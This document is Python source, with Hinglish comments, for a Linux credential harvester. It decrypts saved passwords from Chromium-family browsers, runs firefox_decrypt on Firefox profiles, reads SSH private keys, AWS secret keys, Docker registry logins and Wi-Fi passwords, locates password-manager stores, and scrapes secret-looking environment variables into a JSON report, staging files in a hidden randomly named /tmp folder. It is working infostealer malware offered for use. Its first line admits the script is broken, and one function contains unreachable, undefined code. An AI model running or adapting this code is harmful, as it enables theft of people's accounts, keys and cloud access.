# This script is not working properly.
import os
import sys
import json
import base64
import sqlite3
import shutil
import configparser
import subprocess
import random
from pathlib import Path
from typing import List, Dict, Optional, Tuple
from Crypto.Cipher import AES

class LinuxCredentialHarvester:
    def __init__(self):
        self.all_credentials = []
        self.home = str(Path.home())
        self.temp_dir = self._create_temp_dir()
        self.master_keys = {}
        print("[*] Starting Linux credential harvest", file=sys.stderr)
        
    def _create_temp_dir(self) -> str:
        dir_name = f".cache_{random.randint(10000, 99999)}"
        temp_dir = os.path.join("/tmp", dir_name)
        os.makedirs(temp_dir, exist_ok=True)
        return temp_dir

    def _execute_command(self, cmd: List[str]) -> Optional[str]:
        try:
            return subprocess.check_output(
                cmd,
                stderr=subprocess.DEVNULL
            ).decode('utf-8', errors='ignore').strip()
        except Exception:
            return None

    def _get_linux_master_key(self, local_state_path: str) -> Tuple[Optional[bytes], str]:
        # Chromium-based browsers ke liye master key nikalte hain. Yeh crucial hai decryption ke liye.
        try:
            if not os.path.exists(local_state_path):
                return None, "local_state_not_found"
                
            with open(local_state_path, 'r') as f:
                local_state = json.load(f)
                
            if 'os_crypt' not in local_state or 'encrypted_key' not in local_state['os_crypt']:
                return None, "invalid_local_state"
                
            encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
            
            # Pehle `secret-tool` (GNOME Keyring) se try karein, agar wahaan stored hai toh.
            result = self._execute_command(['secret-tool', 'search', 'application', 'chrome'])
            
            if result:
                return result.encode(), "decrypted"
            
            return encrypted_key, "encrypted_key"
        except Exception as e:
            print(f"[!] Linux master key error: {str(e)}", file=sys.stderr)
            return None, f"error: {str(e)}"

    def _decrypt_password(self, key: Optional[bytes], key_status: str, encrypted_value: bytes) -> Tuple[str, str]:
        # Encrypted passwords ko decrypt karta hai. Yeh is poore script ka dil hai.
        if key is None:
            return base64.b64encode(encrypted_value).decode(), "encrypted_base64"
            
        try:
            # `v10`/`v11` encryption common hai modern browsers mein (GCM mode).
            if encrypted_value.startswith(b'v10') or encrypted_value.startswith(b'v11'):
                nonce = encrypted_value[3:15]
                ciphertext = encrypted_value[15:-16]
                tag = encrypted_value[-16:]
                
                try:
                    # `PyCryptodome` use karke try karein.
                    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
                    decrypted = cipher.decrypt_and_verify(ciphertext, tag).decode()
                    return decrypted, "decrypted"
                except ImportError:
                    pass
                
                try:
                    # Agar `PyCryptodome` nahi toh `Cryptography` library se try karein.
                    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
                    from cryptography.hazmat.backends import default_backend
                    cipher = Cipher(algorithms.AES(key), modes.GCM(nonce, tag), backend=default_backend())
                    decryptor = cipher.decryptor()
                    decrypted = (decryptor.update(ciphertext) + decryptor.finalize()).decode()
                    return decrypted, "decrypted"
                except ImportError:
                    pass
                
                return base64.b64encode(encrypted_value).decode(), "encrypted_base64"
            
            # Older encryption methods (sometimes ECB mode).
            elif len(encrypted_value) > 15:
                try:
                    cipher = AES.new(key, AES.MODE_ECB)
                    decrypted = cipher.decrypt(encrypted_value).decode().rstrip('\x00')
                    return decrypted, "decrypted"
                except ImportError:
                    return base64.b64encode(encrypted_value).decode(), "encrypted_base64"
        
        except Exception as e:
            print(f"[!] Decryption error: {str(e)}", file=sys.stderr)
        
        return base64.b64encode(encrypted_value).decode(), "decryption_failed"

    def _get_browser_paths(self) -> List[tuple]:
        return [
            ('chrome', '~/.config/google-chrome'),
            ('chromium', '~/.config/chromium'),
            ('brave', '~/.config/brave-browser'),
            ('edge', '~/.config/microsoft-edge'),
            ('firefox', '~/.mozilla/firefox'),
            ('librewolf', '~/.librewolf'),
            ('waterfox', '~/.waterfox'),
            ('tor', '~/.tor-browser')
        ]
        
        browsers = []
        for name, path in linux_browsers:
            expanded_path = os.path.expanduser(path)
            if name == 'firefox':
                browsers.append((name, expanded_path, os.path.join(expanded_path, 'profiles.ini')))
            else:
                browsers.append((name, expanded_path, os.path.join(expanded_path, 'Local State')))
        
        return browsers

    def _process_chromium_browser(self, name: str, data_path: str, state_path: str):
        if not os.path.exists(data_path):
            print(f"[!] Browser data path not found: {data_path}", file=sys.stderr)
            return
            
        if not os.path.exists(state_path):
            print(f"[!] Browser state path not found: {state_path}", file=sys.stderr)
            return
            
        if (name, data_path) not in self.master_keys:
            master_key, key_status = self._get_linux_master_key(state_path)
            self.master_keys[(name, data_path)] = (master_key, key_status)
        else:
            master_key, key_status = self.master_keys[(name, data_path)]
        
        profiles = ['Default'] + [d for d in os.listdir(data_path) if d.startswith('Profile')]
        for profile in profiles:
            profile_path = os.path.join(data_path, profile)
            login_data = os.path.join(profile_path, 'Login Data')
            
            if os.path.exists(login_data):
                # Database file ko temp location pe copy karte hain, taki locking issues na aayein.
                temp_db = os.path.join(self.temp_dir, f'{name}_{profile}_logins.db')
                try:
                    shutil.copy2(login_data, temp_db)
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                    
                    for url, user, encrypted_pass in cursor.fetchall():
                        if not url or not user or not encrypted_pass:
                            continue
                        
                        password_value, password_status = self._decrypt_password(
                            master_key, key_status, encrypted_pass
                        )
                        
                        self.all_credentials.append({
                            'type': 'browser',
                            'browser': name,
                            'profile': profile,
                            'url': url,
                            'username': user,
                            'password': password_value,
                            'password_status': password_status,
                            'master_key_status': key_status,
                            'master_key': base64.b64encode(master_key).decode() if master_key else None,
                            'encrypted_password': base64.b64encode(encrypted_pass).decode(),
                            'local_state_path': state_path
                        })
                    conn.close()
                except Exception as e:
                    print(f"[!] Browser DB error ({name}/{profile}): {str(e)}", file=sys.stderr)
                finally:
                    if os.path.exists(temp_db):
                        os.remove(temp_db)

    def _process_firefox_browser(self, name: str, data_path: str, profiles_ini: str):
        if not os.path.exists(profiles_ini):
            print(f"[!] Firefox profiles.ini not found: {profiles_ini}", file=sys.stderr)
            return
            
        try:
            config = configparser.ConfigParser()
            config.read(profiles_ini)
            
            profiles = []
            for section in config.sections():
                if section.startswith('Profile'):
                    path = config[section].get('Path', '')
                    if path:
                        if path.startswith('Profiles/'):
                            path = os.path.join(data_path, path)
                        profiles.append(path)
            
            for profile_path in profiles:
                if not os.path.exists(profile_path):
                    print(f"[!] Firefox profile path not found: {profile_path}", file=sys.stderr)
                    continue
                    
                logins_json = os.path.join(profile_path, 'logins.json')
                key4_db = os.path.join(profile_path, 'key4.db')
                
                if os.path.exists(logins_json) and os.path.exists(key4_db):
                    passwords = self._extract_firefox_passwords(profile_path)
                    
                    self.all_credentials.append({
                        'type': 'browser',
                        'browser': name,
                        'profile': os.path.basename(profile_path),
                        'logins': passwords,
                        'logins_path': logins_json,
                        'key_path': key4_db,
                        'note': 'Passwords may need offline decryption' # Firefox passwords often need external tools/manual effort for decryption on Linux.
                    })
        except Exception as e:
            print(f"[!] Firefox error: {str(e)}", file=sys.stderr)

    def _extract_firefox_passwords(self, profile_path: str) -> List[dict]:
        # Firefox passwords nikalne ki koshish. Requires `firefox_decrypt` tool for direct decryption.
        try:
            result = self._execute_command(['firefox_decrypt', profile_path])
            if result:
                logins = []
                for line in result.split('\n'):
                    if '://' in line:
                        parts = line.split()
                        if len(parts) >= 2:
                            url = parts[0]
                            username = parts[1] if len(parts) > 1 else ""
                            password = parts[2] if len(parts) > 2 else ""
                            logins.append({'url': url, 'username': username, 'password': password})
                return logins
            
            # Agar `firefox_decrypt` available nahi hai, toh encrypted data hi le lo.
            with open(os.path.join(profile_path, 'logins.json'), 'r') as f:
                logins_data = json.load(f)
                return [{
                    'url': item.get('hostname', ''),
                    'username': item.get('encryptedUsername', ''),
                    'password': item.get('encryptedPassword', ''),
                    'encrypted': True,
                    'decryption_hint': 'Use firefox_decrypt.py or DBUS methods'
                } for item in logins_data.get('logins', [])]
        except Exception as e:
            print(f"[!] Firefox password extraction error: {str(e)}", file=sys.stderr)
            return [{'error': str(e)}]

    def _get_linux_credentials(self):
        # System-wide sensitive files collect karta hai.

        # SSH credentials.
        ssh_dir = os.path.join(self.home, '.ssh')
        if os.path.exists(ssh_dir):
            for item in os.listdir(ssh_dir):
                # Common SSH key and config files.
                if item in ['id_rsa', 'id_ed25519', 'id_ecdsa', 'known_hosts', 'config', 'authorized_keys']:
                    try:
                        with open(os.path.join(ssh_dir, item), 'r') as f:
                            content = f.read()
                            self.all_credentials.append({
                                'type': 'ssh',
                                'file': item,
                                'content': content
                            })
                    except Exception:
                        continue
        
        # AWS credentials.
        aws_path = os.path.join(self.home, '.aws/credentials')
        if os.path.exists(aws_path):
            try:
                config = configparser.ConfigParser()
                config.read(aws_path)
                for section in config.sections():
                    self.all_credentials.append({
                        'type': 'aws',
                        'profile': section,
                        'access_key_id': config[section].get('aws_access_key_id', ''),
                        'secret_access_key': config[section].get('aws_secret_access_key', '')
                    })
            except Exception:
                pass
        
        # Docker credentials.
        docker_path = os.path.join(self.home, '.docker/config.json')
        if os.path.exists(docker_path):
            try:
                with open(docker_path, 'r') as f:
                    docker_config = json.load(f)
                    if 'auths' in docker_config:
                        for registry, auth in docker_config['auths'].items():
                            if 'auth' in auth:
                                # Docker auths base64-encoded hote hain.
                                decoded = base64.b64decode(auth['auth']).decode()
                                username, password = decoded.split(':', 1)
                                self.all_credentials.append({
                                    'type': 'docker',
                                    'registry': registry,
                                    'username': username,
                                    'password': password
                                })
            except Exception:
                pass
        
        # WiFi credentials. `nmcli` tool ka use.
        if self._execute_command(['which', 'nmcli']): # Check karte hain `nmcli` installed hai ya nahi.
            connections = []
            output = self._execute_command(['nmcli', '-t', '-f', 'name,device', 'connection', 'show'])
            if output:
                for line in output.split('\n'):
                    if line:
                        name, device = line.split(':')[:2]
                        if device and name not in connections:
                            connections.append(name)
            
            for conn in connections:
                output = self._execute_command(['nmcli', '-s', 'connection', 'show', conn])
                if output:
                    password = None
                    for line in output.split('\n'):
                        if '802-11-wireless-security.psk:' in line: # Wi-Fi password line se extract karna.
                            password = line.split(':')[1].strip()
                    
                    if password:
                        self.all_credentials.append({
                            'type': 'wifi',
                            'ssid': conn,
                            'password': password
                        })
        
        # Password manager detection.
        pass_dir = os.path.join(self.home, '.password-store')
        if os.path.exists(pass_dir):
            self.all_credentials.append({
                'type': 'password_manager',
                'name': 'pass',
                'path': pass_dir,
                'note': 'GPG-encrypted passwords stored in directory'
            })
        
        keepassxc_dir = os.path.join(self.home, '.config/keepassxc')
        if os.path.exists(keepassxc_dir):
            kdbx_files = []
            for root, _, files in os.walk(keepassxc_dir):
                for file in files:
                    if file.endswith('.kdbx'):
                        kdbx_files.append(os.path.join(root, file))
            if kdbx_files:
                self.all_credentials.append({
                    'type': 'password_manager',
                    'name': 'KeePassXC',
                    'database_files': kdbx_files
                })

    def _get_environment_credentials(self):
        # Environment variables mein sensitive data dhoondhta hai.
        sensitive_vars = {}
        for var in os.environ:
            var_lower = var.lower()
            if any(x in var_lower for x in ['pass', 'secret', 'key', 'token', 'cred']): # Common keywords for sensitive variables.
                sensitive_vars[var] = os.environ[var]
        if sensitive_vars:
            self.all_credentials.append({
                'type': 'environment_variables',
                'variables': sensitive_vars
            })

    def collect_all(self):
        print("[*] Collecting browser credentials...", file=sys.stderr)
        for name, data_path, state_path in self._get_browser_paths():
            if 'firefox' in name.lower():
                self._process_firefox_browser(name, data_path, state_path)
            else:
                self._process_chromium_browser(name, data_path, state_path)
        
        print("[*] Collecting system credentials...", file=sys.stderr)
        self._get_linux_credentials()
        
        print("[*] Collecting environment variables...", file=sys.stderr)
        self._get_environment_credentials()
        
        print("[*] Credential collection complete", file=sys.stderr)

    def clean_up(self):
        try:
            shutil.rmtree(self.temp_dir, ignore_errors=True)
        except Exception:
            pass

    def get_results(self) -> List[Dict]:
        return self.all_credentials

def main():
    harvester = LinuxCredentialHarvester()
    harvester.collect_all()
    
    results = harvester.get_results()
    report=json.dumps(results, indent=2)
    
    harvester.clean_up()
    return report
